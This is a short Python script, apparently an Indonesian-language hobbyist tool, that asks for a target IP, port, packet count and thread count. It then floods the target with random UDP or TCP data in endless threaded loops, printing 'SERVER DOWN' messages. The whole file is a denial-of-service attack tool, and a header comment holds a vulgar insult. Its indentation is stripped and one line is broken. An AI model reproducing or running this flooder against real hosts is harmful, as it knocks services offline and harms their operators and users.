#!/usr/bin/env python3
#AUTOR BY XalBadoR
#RENAME PM KONTOL
import random
import socket
import threading
import os
import sys


os.system("clear")
print(" AUTOR : XALBADOR
print("██╗░░██╗")
print("╚██╗██╔╝")
print("░╚███╔╝░")
print("░██╔██╗░")
print("██╔╝╚██╗")
print("╚═╝░░╚═╝")

ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" Gaskan Ga?(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
def run():
data = random._urandom(1180)
i = random.choice(("[PERMISI PAKETT]","[PERMISI PAKET]","[PERMISI PAKET]"))
while True:
try:
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
addr = (str(ip),int(port))
for x in range(times):
s.sendto(data,addr)
print(i +" PAKET FROM XALBADOR!!!")
except:
print("[!] SERVER DOWN..!!!")

def run2():
data = random._urandom(1475)
i = random.choice(("[PERMIS PAKET]","[PERMISI PAKET]","[PERMISI PAKET]"))
while True:
try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(data)
for x in range(times):
s.send(data)
print(i +" PAKET FROM XALBADOR!!!")
except:
s.close()
print("[*] SERVER DOWN..!!!")

for y in range(threads):
if choice == 'y':
th = threading.Thread(target = run)
th.start()
else :
th = threading.Thread(target = run2)
th.start()